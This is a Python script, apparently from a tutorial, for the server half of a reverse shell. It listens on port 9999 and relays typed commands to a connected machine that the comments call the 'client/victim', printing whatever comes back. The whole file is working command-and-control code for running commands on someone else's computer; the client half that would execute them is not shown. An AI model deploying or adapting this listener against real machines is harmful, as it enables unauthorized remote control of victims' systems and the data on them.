import socket
import sys

# creating socket for server


def create_socket():
    try:
        global host
        global port
        global sockfd
        host = ""   # the IP address is going to be itself because the server file will be in our host only (localhost/local computer)
        port = 9999  # port at which server will communicate; port address will be same in both client & server
        sockfd = socket.socket()

    except socket.error as err:
        print(f"Socket creation error: {err}")

# binding host & port and listening for connections


def bind_listen_socket():
    try:
        global host
        global port
        global sockfd

        print(f"Binding the port: {port}")
        sockfd.bind((host, port))
        sockfd.listen(5)  # queue upto 5 requests

    except socket.error as err:
        print(f"Socket binding or listening failed {err}\nRetrying...")
        bind_listen_socket()

# Establishing connection with client (socket must be listening)


def socket_accept():
    conn, address = sockfd.accept()
    # conn --> object of the connections/conversation [OR] it is a new socket object usable to send and receive data on the connection
    # address --> is the address bound to the socket on the other end of the connection [OR] list containing IP address & port bound to the socket on the other
    # accept function will only return if the connection is accepted
    print(f"Connection established !\nIPv4 of the Client: {address[0]} | Port address of the Client: {address[1]}")
    send_commands(conn)
    conn.close()

# Sending commands to client/victim


def send_commands(conn):
    while True:
        # for sending multiple commands
        cmd = input()
        if cmd == "quit":
            conn.close()  # closing the connection/conversation
            sockfd.close()  # closing the socket
            sys.exit()  # for terminating the program

        # when you send data from one computer to another, it isn't send in the format of a string but in the format of bytes
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))  # sending in format of bytes
            client_response = str(conn.recv(1024), "utf=8")  # returned value from recv() is a bytes object representing the data received
            # here, 1024 is the buffer size i.e, data recieved are recieved in chunks & the size if these chunks is 1024
            print(client_response)


def main():
    create_socket()
    bind_listen_socket()
    socket_accept()


main()
